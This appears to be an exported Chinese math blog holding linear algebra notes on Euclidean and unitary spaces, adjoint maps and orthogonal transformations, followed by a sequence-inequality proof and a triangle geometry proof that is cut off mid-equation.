2"></a>Example 2</h3><ul><li>$\mathbb{R}^{m\times n}\quad \left&lt;A, B\right&gt; = trace(B^TA)$ 是 $\mathbb{R}^{m\times n}$ 上的标准内积.</li></ul><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><ul><li>$\mathcal{C}\left[a, b\right]\quad \left&lt;f, g\right&gt; = \int_a^b{f\left( x \right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.</li></ul><h3 id="Definition-2-1"><a href="#Definition-2-1" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>定义向量的长度 $\left| a \right|=\sqrt{\left&lt;a,a\right&gt;}$, 对 $a\in\mathcal{V}$;</li><li>定义向量间的距离为 $\left| a-b \right|$, 对 $a, b\in\mathcal{V}$.</li></ul><h3 id="Property-1-1"><a href="#Property-1-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left&lt; a, b \right&gt; \right|$ ≤ $\left| a \right| \cdot \left| b \right| $.</p></li></ul><h3 id="Property-2"><a href="#Property-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li><p>$(Triangular\ Inequality)$</p><p>$\left| a+b \right|$ ≤ $\left| a \right| + \left| b \right| $.</p></li></ul><h3 id="Definition-3-1"><a href="#Definition-3-1" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>在 $n$ 维欧氏空间 $\mathcal{V}$ 中, 由 $n$ 个向量组成的正交向量组称为 $\mathcal{V}$ 的一组正交基.</li><li>特别地,当这 $n$ 个向量均为单位向量时,称它们构成欧氏空间 $\mathcal{V}$ 的一组标准正交基.</li></ul><h3 id="Question-1-1"><a href="#Question-1-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>$\mathbb{R}^{m\times n}$上的一组标准正交基是什么?</li><li>是 $E_{ij}(1 \le i \le m, 1 \le j \le n)$, 其中 $E_{ij}$ 表示第 $i$ 行, 第 $j$ 列元素为1, 其余元素均为0的 $m\times n$ 矩阵.</li></ul><h3 id="Question-2-1"><a href="#Question-2-1" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>$Gram Schmidt$ 正交化方法如何推广到欧氏空间?</li><li>$(a_1, \dots, a_r) = (q_1, \dots, q_r)R$, $R$ 为上三角阵.</li></ul><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><ul><li>定义 $\left&lt;f, g\right&gt; = \int_{-1}^{1}{f\left( x \right) g\left( x \right) dx}$ 是 $\mathbb{R}\left[x\right]$ 上的标准内积, </li><li>对 $1, x, x^2, \dots$ 这组基进行 $Gram Schmidt$ 正交化(这里 $\mathbb{R}\left[x\right]$ 指实数域 $\mathbb{R}$ 上的多项式空间).</li><li>这里不妨考虑简单情形, 对 $q_1=1, q_2=x, q_3=x^2$ 进行 $Gram Schmidt$ 正交化, 得到 $\tilde{q}_1=1, \tilde{q}_2=x, \tilde{q}_3=x^2 - \frac{1}{3}$.</li></ul><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul><li>基扩充定理可以直接推广至欧氏空间, i.e.有限维欧氏空间中任意正交向量组可以扩充为一组相应的正交基.</li></ul><h3 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h3><ul><li>如何利用坐标计算内积?</li><li>欧氏空间 $\mathcal{V}$ 一组基底为 $a_1,a_2,\dots,a_n$, $x,y\in\mathcal{V}$, 在这组基下的坐标分别为 $(x_1,\dots,x_n)^T, (y_1,\dots,y_n)^T$,<ul><li>$\left&lt;x, y\right&gt; = \left&lt;\sum_{i = 1}^n{a_ix_i}, \sum_{j = 1}^n{a_jy_j}\right&gt; =<br>\sum_{i = 1}^n\sum_{j = 1}^n x_iy_j\left&lt;a_i, a_j\right&gt; = {\hat{x}}^TG\hat{y},$</li></ul></li><li>其中 $G$ 称为内积在基 $a_1,a_2,\dots,a_n$ 下的 $Gram$ 矩阵, $\hat{x}$, $\hat{y}$ 称为 $x, y$ 在这组基下的坐标.</li></ul><h3 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h3><ul><li>当基改变时, 度量矩阵如何改变?<ul><li>$x = (e_1, \dots, e_n)\hat{x} = (t_1, \dots, t_n)\tilde{x}$,</li><li>$y = (e_1, \dots, e_n)\hat{y} = (t_1, \dots, t_n)\tilde{y}$,</li></ul></li><li>设内积在基 $(e_1, \dots, e_n)$ 下的 $Gram$ 矩阵为 $G$, 在基 $(t_1, \dots, t_n)$ 下的 $Gram$ 矩阵为 $\tilde{G}$, 容易得到</li></ul><p>$$<br>\begin{aligned}<br>\tilde{x}^T\tilde{G}\tilde{y} &amp;= \left&lt;(t_1, \dots, t_n)\tilde{x}, (t_1, \dots, t_n)\tilde{y}\right&gt; \<br>                      &amp;= \left&lt;(e_1, \dots, e_n)\hat{x}, (e_1, \dots, e_n)\hat{y}\right&gt; \<br>                      &amp;= \left&lt;(e_1, \dots, e_n)(T\tilde{x}), (e_1, \dots, e_n)(T\tilde{y})\right&gt; \<br>                      &amp;= (T\tilde{x})^TG(T\tilde{y}) \<br>                      &amp;= \tilde{x}^T(T^TGT)\tilde{y}<br>\end{aligned}, \forall\tilde{x}, \tilde{y},<br>$$</p><ul><li>其中 $(t_1, \dots, t_n) = (e_1, \dots, e_n)T$.</li></ul><h3 id="Property-3"><a href="#Property-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$\mathcal{V}$ 为欧氏空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $T$ 为 $n$ 阶方阵, $(t_1, \dots, t_n) = (e_1, \dots, e_n) T$, 则<ul><li>$(t_1, \dots, t_n)$ 为一组标准正交基 $\Longleftrightarrow T$ 是正交阵.</li></ul></li></ul><h3 id="Definition-4-1"><a href="#Definition-4-1" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>对欧氏空间 $\mathcal{V}$ 与 $\mathcal{U}$, 如果 $\mathcal{U}\subset\mathcal{V}$, 则称 $\mathcal{U}$ 为 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Definition-5"><a href="#Definition-5" class="headerlink" title="Definition 5"></a>Definition 5</h3><ul><li>$\mathcal{M}$ 是欧氏空间 $\mathcal{V}$ 的子欧氏空间, 称 ${\mathcal{M}}^{\bot} = \left{a \in \mathcal{V} \mid \left&lt;a, b\right&gt; = 0, \forall b \in \mathcal{V}\right}$ 为其正交补.</li></ul><h3 id="Property-4"><a href="#Property-4" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$\mathcal{M}^{\bot}$ 是欧氏空间 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h3><ul><li>$\mathcal{M, N}$ 是 $\mathcal{V}$ 的子空间, 是否存在同时包含 $\mathcal{M, N}$ 的属于 $\mathcal{V}$ 的最小子空间?</li><li>考虑 $\left{m + n\mid m\in\mathcal{M}, n\in\mathcal{N}\right}$, 称为 $M$ 和 $N$ 的和, 记作 $\mathcal{M}+\mathcal{N}$, 它满足所需要求.</li></ul><h3 id="Property-5"><a href="#Property-5" class="headerlink" title="Property 5"></a>Property 5</h3><p>- </p><p>$$<br>\begin{equation}<br>\mathcal{M}\cap \mathcal{M}^{\bot} = \varnothing<br>\end{equation}<br>$$</p><p>$$<br>\begin{equation}<br>\mathcal{M} + \mathcal{M}^{\bot} = \mathcal{V}<br>\end{equation}<br>$$</p><ul><li>设 $\mathcal{M}$ 的一组正交基为 $q_1, \dots, q_r$, 根据基扩充定理, 可扩充 $q_{r+1}, \dots, q_n$,<br>使得 $(q_1, q_2, \dots, q_n)$ 构成 $\mathcal{V}$ 的一组正交基, 那么 ${\mathcal{M}}^{\bot}$ 的一组正交基即为 $q_{r+1}, \dots, q_n$.</li></ul><h3 id="Property-6"><a href="#Property-6" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$dim(\mathcal{M})+dim(\mathcal{M}^{\bot})=dim(\mathcal{V})$.</li><li>$(\mathcal{M}^{\bot})^{\bot} = \mathcal{M}$.</li></ul><h2 id="Chapter-3-欧氏空间上的线性映射"><a href="#Chapter-3-欧氏空间上的线性映射" class="headerlink" title="Chapter 3 欧氏空间上的线性映射"></a>Chapter 3 欧氏空间上的线性映射</h2><h3 id="Definition-1-2"><a href="#Definition-1-2" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;<em>{\mathcal{U}}\right)$, $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;</em>{\mathcal{V}}\right)$, $f\in\mathscr{Hom}\mathcal{(U, V)}, g\in\mathscr{Hom}\mathcal{(V, U)}$,</li><li>使得 $\forall x\in\mathcal{U},y\in\mathcal{V}$, 有$$\left&lt;f(x),y\right&gt;<em>{\mathcal{V}}=\left&lt;x,g(y)\right&gt;</em>{\mathcal{U}},$$<br>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Property-1-2"><a href="#Property-1-2" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>$\left(f^<em>\right)^</em>=f$.<ul><li>$\forall x\in\mathcal{U},y\in\mathcal{V}$,<br>有 $\left&lt;(f^*)^*(x),y\right&gt;<em>{\mathcal{V}}=\left&lt;y,(f^*)^*(x)\right&gt;</em>{\mathcal{V}}=\left&lt;f^*(y),x\right&gt;<em>{\mathcal{U}}=\left&lt;x,f^*(y)\right&gt;</em>{\mathcal{U}}=\left&lt;f(x),y\right&gt;<em>{\mathcal{V}}$,<br>从而 $\left&lt;(f^*)^*(x)-f(x),y\right&gt;</em>{\mathcal{V}}=0$, $\forall x\in\mathcal{U},y\in\mathcal{V}$.<br>故 $(f^*)^*(x)-f(x)=0$, $\forall x\in\mathcal{U}$.<br>进而有 $\left(f^<em>\right)^</em>=f$ 成立.</li></ul></li></ul><h3 id="Property-2-1"><a href="#Property-2-1" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$(g\circ f)^*=f^<em>\circ g^</em>$.</li></ul><h3 id="Question-1-2"><a href="#Question-1-2" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何从矩阵的角度理解伴随映射? <ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{R}^n, \mathcal{V}=\mathbb{R}^m$ 及其上的标准内积,<br>$$f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{R}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;$$<br>$$f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{R}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.$$<br>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$,<br>有 $y^TAx=\left&lt;Ax,y\right&gt;=\left&lt;f(x),y\right&gt;=\left&lt;x,f^*(y)\right&gt;=\left&lt;x,By\right&gt;=y^TB^Tx$,<br>进而 $A=B^T$ 成立.</li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<br>$$u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.$$<br>考虑 $\left&lt;(f(u_i),v_j\right&gt;<em>{\mathcal{V}}=\left&lt;u_i, f^*(v_j)\right&gt;</em>{\mathcal{U}}, \forall 1\le i\le n, 1\le j\le m$.<br>其中:<br>$LHS=\left&lt;(v_1, \dots, v_m)(f_{1i}, \dots, f_{mi})^T, v_j\right&gt;<em>{\mathcal{V}}=\left&lt;\sum_{k=1}^mv_kf_{ki},v_j\right&gt;</em>{\mathcal{V}}=f_{ji}$,<br>$RHS=\left&lt;u_i, (u_1, \dots, u_n)(g_{1j}, \dots, g_{nj})^T\right&gt;<em>{\mathcal{U}}=\left&lt;u_i,\sum_{k=1}^nu_kg_{kj}\right&gt;</em>{\mathcal{V}}=g_{ij}$,<br>因此 $\forall 1\le i\le n, 1\le j\le m, f_{ji}=g_{ij}$ 成立. 即 $F=G^T$.</li></ul></li></ul><h3 id="Definition-2-2"><a href="#Definition-2-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有$$\left&lt;f(x),y\right&gt;=\left&lt;x,f(y)\right&gt;,$$<br>则称 $f$ 为 $\mathcal{U}$ 上的一个自伴变换(对称变换).</li></ul><h3 id="Property-3-1"><a href="#Property-3-1" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, $dim\mathcal{U}=n$.<ul><li>$1)$ $f$ 为对称变换 $\Longleftrightarrow$ $f=f^*$;</li><li>$2)$ $f$ 为对称变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是对称矩阵.</li></ul></li><li><em><strong>Proof:</strong></em><ul><li>$1)$ $\Longleftarrow:$ $\left&lt;x,f(y)\right&gt;=\left&lt;x,f^*(y)\right&gt;=\left&lt;f(x),y\right&gt;$;<br>$\quad\Longrightarrow: f^*(y)=\sum\limits_{i=1}^n\left&lt;v_i, f^*(y)\right&gt;v_i =\sum\limits_{i=1}^n\left&lt;f(y), v_i\right&gt;v_i =\sum\limits_{i=1}^n\left&lt;f(y), v_i\right&gt;v_i=f(y)$, $\forall y\in\mathcal{U}$, 故 $f=f^*$.</li><li>$2)$ $\Longleftarrow:$ 设 $f$ 在标准正交基下的矩阵为 $A$, 则 $f$ 对称 $\Longrightarrow$ $f=f^*$ $\Longrightarrow$ $A=A^T$ $\Longrightarrow$ $A$ 对称.<br>$\quad\Longrightarrow:$ 在 $Chapter 1$ 中已经证明.</li></ul></li></ul><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^{n\times n}\quad \left&lt;A, B\right&gt; = trace(B^TA)$ 是 $\mathbb{R}^{n\times n}$ 上的标准内积.<br>$$f:\mathbb{R}^{n\times n}\rightarrow\mathbb{R}^{n\times n}\quad A\rightarrow A^T.$$</li><li>考虑 $\left&lt;f(A), B\right&gt;=trace(B^TA^T)=trace(AB)=trace(BA)$,<br>则 $\left&lt;A, f^*(B)\right&gt;=trace(f^*(B)^TA)$, 那么 $f^*=f$.</li></ul><h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathcal{C}_T^\infty(\mathbb{R})=\left{f\in\mathcal{C}^\infty(\mathbb{R})\mid f(x)=f(x+T),\forall x\in\mathbb{R}\right}$</li><li>$\left&lt;f, g\right&gt; = \int_a^b{f\left(x\right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.<br>$$D:\mathcal{C}_T^\infty(\mathbb{R})\rightarrow\mathcal{C}_T^\infty(\mathbb{R})\quad f\rightarrow f’.$$</li><li>由 $\left&lt;D(f), g\right&gt;=\int_0^Tf’(x)g(x)dx=\int_0^Tg(x)df(x)=fg|_0^T-\int_0^Tf(x)g’(x)dx=-\int_0^Tf(x)g’(x)dx=\left&lt;f, -D(g)\right&gt;$, 那么 $d^*=-D$.</li></ul><h3 id="Definition-3-2"><a href="#Definition-3-2" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有$$\left&lt;f(x),f(y)\right&gt;=\left&lt;x,y\right&gt;,$$<br>则称 $f$ 为 $\mathcal{U}$ 上的一个正交变换.</li></ul><h3 id="Property-4-1"><a href="#Property-4-1" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, 以下命题等价:<ul><li>$1)$ $f$ 为正交变换;</li><li>$2)$ $f$ 为保距变换;</li><li>$3)$ $f$ 把 $\mathcal{U}$ 的一组标准正交基映为另一组标准正交基.</li></ul></li></ul><h3 id="Property-5-1"><a href="#Property-5-1" class="headerlink" title="Property 5"></a>Property 5</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$.<ul><li>$1)$ $f$ 为正交变换 $\Longleftrightarrow$ $f\circ f^*=f^*\circ f=id_{\mathcal{U}}$;</li><li>$2)$ $f$ 为保距变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是正交矩阵.</li></ul></li></ul><h3 id="Property-6-1"><a href="#Property-6-1" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$Q$ 为实正交矩阵, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li></ul><h3 id="Property-7"><a href="#Property-7" class="headerlink" title="Property 7"></a>Property 7</h3><ul><li>$Q$ 为 $n$ 阶正交矩阵, 存在 $n$ 阶正交矩阵 $X$, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li><li>其中 $\theta_{i}$ 不是平角的倍数, $J$ 称为 $Q$ 的实相似标准型.</li></ul><h3 id="Tip-1-1"><a href="#Tip-1-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>给定 $n$ 维欧氏空间 $\mathcal{V}$ 及其上的正交变换 $f:\mathcal{V}\rightarrow\mathcal{V}$, 都存在着 $\mathcal{V}$ 的一组标准正交基, 使得 $f$ 在该组基下的矩阵形如<strong>Property 7</strong>中的 $J$.</li></ul><h3 id="Tip-2-1"><a href="#Tip-2-1" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>任意 $n$ 阶正交矩阵 $Q$ 都可以分解为不超过 $n$ 个反射矩阵的乘积.</li></ul><h2 id="Chapter-4-酉空间"><a href="#Chapter-4-酉空间" class="headerlink" title="Chapter 4 酉空间"></a>Chapter 4 酉空间</h2><h3 id="Question-1-3"><a href="#Question-1-3" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>能否在复向量空间 $\mathcal{V}$ 上定义内积?</li><li>注意到如果不对内积的定义进行修改, 考虑内积 $\left&lt;ia, ia\right&gt;$, 那么正定性与双线性性是彼此矛盾的.</li></ul><h3 id="Definition-1-3"><a href="#Definition-1-3" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间$\mathcal{V}/\mathbb{C}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{C}$, 满足$\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 共轭对称性: $\left&lt;a, b\right&gt; = \overline{\left&lt;b, a\right&gt;}$;</li><li>$b)$ 线性性和共轭线性性: $\left&lt;k_1a_1+k_2a_2, b\right&gt; = k_1\left&lt;a_1, b\right&gt; + k_2\left&lt;a_2, b\right&gt;$;<br>$\quad\qquad\qquad\qquad\qquad\left&lt;a, k_1b_1+k_2b_2\right&gt; = \overline{k_1}\left&lt;a, b_1\right&gt; + \overline{k_2}\left&lt;a, b_2\right&gt;$;</li><li>$c)$ 正定性: $\left&lt;a, a\right&gt; \ge 0$, 取等当且仅当 $a = 0$.</li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, $\mathcal{V}$ 是一个酉空间.</li></ul><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{C}^n\quad \left&lt;a, b\right&gt; = \overline{b}^Ta$ 是 $\mathbb{C}^n$上的标准内积.<br>$D$ 是对角元素均为正的对角阵, $\left&lt;a, b\right&gt; = \overline{b}^TDa$.</li></ul><h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathbb{C}^{m\times n}\quad \left&lt;A, B\right&gt; = trace(\overline{B}^TA)$ 是 $\mathbb{C}^{m\times n}$ 上的标准内积.</li></ul><h3 id="Property-1-3"><a href="#Property-1-3" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left&lt;a, b\right&gt; \right|$ ≤ $\left| a \right|\cdot \left| b \right| $.</p></li><li><p>等号成立当且仅当 $a, b$ 共线, 其中 $a, b\in$ 酉空间 $\mathcal{V}$.</p></li></ul><h3 id="Definition-2-3"><a href="#Definition-2-3" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{V}}\right)$, $f, g\in\mathcal{Hom}\mathcal{(V, V)}$, 使得 $\forall x, y\in\mathcal{V}$, 有$$\left&lt;f(x),y\right&gt;=\left&lt;x,g(y)\right&gt;,$$</li><li>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Question-2-2"><a href="#Question-2-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>如何从矩阵的角度理解伴随映射?<ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{C}^n, \mathcal{V}=\mathbb{C}^m$ 及其上的标准内积,<br>$$f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{C}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;$$<br>$$f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{C}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.$$<br>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$, 有 $\overline{y}^TAx=\left&lt;Ax,y\right&gt;=\left&lt;f(x),y\right&gt;=\left&lt;x,f^*(y)\right&gt;=\left&lt;x,By\right&gt;=\overline{y}^T\overline{B}^Tx$,<br>进而 $A=\overline{B}^T, B=\overline{A}^T:=A^H$ 成立.</li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<br>$$u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.$$<br>设 $f:\mathcal{U}\rightarrow\mathcal{V}$ 在两组基下表示矩阵为 $F$, 则 $f^*:\mathcal{V}\rightarrow\mathcal{U}$ 的表示矩阵为 $F^H$.</li></ul></li></ul><h3 id="Definition-2-4"><a href="#Definition-2-4" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\mathcal{V}$, 其上的变换 $f\in\mathcal{Hom}\mathcal{(V, V)}$ 以及相应的矩阵 $A$. 使得 $\forall x, y\in\mathcal{V}$, 有<ul><li>$a)$ (自伴变换) $\left&lt;f(x),y\right&gt;=\left&lt;x,f(y)\right&gt; \leftrightarrow f=f^* \leftrightarrow A=A^H$;</li><li>$b)$ (酉变换) $\left&lt;f(x),f(y)\right&gt;=\left&lt;x,y\right&gt; \leftrightarrow ff^*=f^*f=id_{\mathcal{V}} \leftrightarrow AA^H=A^HA=I$;</li><li>$c)$ (正规变换) $ff^*=f^*f \leftrightarrow AA^H=A^HA$.</li></ul></li></ul><h3 id="Property-2-2"><a href="#Property-2-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$\mathcal{V}$ 为酉空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $U$ 为 $n$ 阶方阵, $(u_1, \dots, u_n) = (e_1, \dots, e_n) U$, 则<br>$(u_1, \dots, u_n)$为一组标准正交基 $\Longleftrightarrow U$ 是酉矩阵 $\Longleftrightarrow U$ 的列向量是 $\mathbb{C}^n$ 的标准正交基.</li></ul><h3 id="Property-3-2"><a href="#Property-3-2" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>酉空间 $\mathcal{V}:(u_1, \dots, u_n)=(e_1, \dots, e_n)U$, 其中 $(u_1, \dots, u_n), (e_1, \dots, e_n)$ 是 $\mathcal{V}$ 的标准正交基.</li><li>线性映射 $f:\mathcal{V}\rightarrow\mathcal{V}$, 记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{u_1,\dots, u_n}(f) = U^{-1}FU = U^HFU$.</li></ul><h3 id="Tip-1-2"><a href="#Tip-1-2" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$A, B$ 为复矩阵, 若存在酉矩阵 $U$, 使得 $U^HAU=B$, 则称 $A, B$ 酉相似.</li></ul><h3 id="Definition-3-3"><a href="#Definition-3-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对任意 $n$ 阶方阵 $A$, 存在酉矩阵 $U$, 使得 $U^HAU=T$, $T$ 为上三角矩阵, 且对角元为 $A$ 的特征值.</li><li>通过选取 $U$, 可以将 $T$ 的对角元实现任意顺序排列.</li></ul><h3 id="Property-3-3"><a href="#Property-3-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$Hermite$ 矩阵的特征值都是实数.</li><li>酉矩阵的特征值都是模长为1的复数.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代数一隅</title>
      <link href="/6/"/>
      <url>/6/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>正项数列 ${a_n}$ 满足 $a_{n+1}=\frac{n}{a_n}+1$. 求证: $\exists\thinspace k\in N$, 对 $\forall\thinspace n&gt;k$, 有 $a_{n+2}&gt;a_n$.</p><p><strong>Proof:</strong></p><p>$$a_2=\frac{1}{a_1}+1&gt;1,$$</p><p>$$a_3=\frac{2}{a_2}+1\in(1, 3),$$</p><p>$$a_4=\frac{3}{a_3}+1\in(2, 4),$$</p><p>$$a_5=\frac{4}{a_4}+1\in(2, 3),$$</p><p>$$a_6=\frac{5}{a_5}+1\in(\frac{8}{3}, \frac{7}{2}).$$</p><p>下证: 当 $n\ge 6$ 时, $\sqrt{n}&lt;a_n&lt;\sqrt{n+1}+1.$</p><p>$(1)$ 当 $n=6$ 时, 显然有 $\sqrt{6}&lt;\frac{8}{3}&lt;a_6&lt;\frac{7}{2}&lt;\sqrt{7}+1$ 成立.</p><p>$(2)$ 假设命题对 $n$ 成立,</p><p>那么 $a_{n+1}&lt;\frac{n}{\sqrt{n}}+1=\sqrt{n}+1&lt;\sqrt{n+2}+1$,</p><p>且 $a_{n+1}&gt;\frac{n}{\sqrt{n+1}+1}+1=\sqrt{n+1}$.</p><p>由$(1), (2)$可知,</p><p>$$\mbox{当}\thinspace n\ge 6\thinspace\mbox{时}, \sqrt{n}&lt;a_n&lt;\sqrt{n+1}+1.$$</p><p>从而 $(a_n-1)^2&lt;n+1,$ 即 $a_n^2-2a_n-n&lt;0, \forall\thinspace n\ge 6.$</p><p>当 $n \ge 6$ 时, 有</p><p>$$a_{n+2}=\frac{n+1}{\frac{n}{a_n}+1}+1&gt;a_n\mbox{成立}.$$</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/5/"/>
      <url>/5/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>设$O, H$分别为$\triangle ABC$的外心和垂心, 过$AH$的中点$M$且垂直于$BM$的直线与$AC$交于$P$. 求证: $OP\parallel BC$.</p><p><strong>Proof:</strong></p><p>作$\odot O$直径$AD$, 取边$BC$中点$E$;</p><p>连接$BH$并延长交边$AC$于点$F$, 那么$BF\perp AC$;</p><p>延长$AH$交$\odot O$于点$H’$, 那么$AH’\perp BC$;</p><p>连接$BH’, CD$交于点$G$.</p><p>由垂心定理, 知$AH=2OE$, 连接$DH$交直线$OE$于点$E’$, </p><p>由$OE’\parallel AH,\thinspace AO=OD$, 知$OE’$为$\triangle ADH$的中位线, </p><p>故$OE’=\frac{1}{2}AH=OE$, 从而点$E, E’$重合, 即$D, E, H$三点共线. </p><p>连接$BD, DH’, H’C$,</p><p>由$\angle BAD=\angle BAO=90^{\circ}-\frac{1}{2}\angle AOB=90^{\circ}-\angle ACB=\angle HAC=\angle H’AC$,</p><p>知$BD=CH’$, 四边形$BDHC’$为等腰梯形, 由对称性知$O, E, G$三点共线.</p><p>由$\angle BH’H=\angle AH’B=\angle ACB=\angle BHH’$, 故$BH=BH’$.</p><p>又$BC\perp HH’$, 故$H, H’$关于直线$BC$对称.</p><p>要证明$OP\parallel BC \Longleftrightarrow \angle APO=\angle ACB$. </p><p>$(a)$ 先证明$\angle ACB=\angle OGC$.<br>\begin{equation*}<br>\begin{aligned}<br>\angle OGC &amp;= \angle GOD+\angle GDO\<br>&amp;=\angle H’AD+\angle CDA\<br>&amp;=(\angle BAC-\angle BAO-\angle CAH)+\angle CBA \<br>&amp;=\angle BAC-(90^\circ-\frac{1}{2}\angle AOB)-(90^\circ-\angle ACB)+\angle CBA \<br>&amp;=2\angle ACB+\angle ABC+\angle BAC-180^\circ\<br>&amp;=\angle ACB.<br>\end{aligned}<br>\end{equation*}</p><p>$(b)$ 再证明$\angle APO=\angle OGC\Longleftrightarrow O, P, G, C$四点共圆.</p><p>连接边$OH’$, 注意到<br>\begin{equation*}<br>\begin{aligned}<br>\angle OH’C &amp;= \angle OH’A+\angle AH’C\<br>&amp;=\angle OAH’+\angle ADC\<br>&amp;=\angle DOG+\angle ODG\<br>&amp;=\angle OGC,<br>\end{aligned}<br>\end{equation*}</p><p>故<br>\begin{equation}<br>O, H’, G, C\thinspace\mbox{四点共圆}. 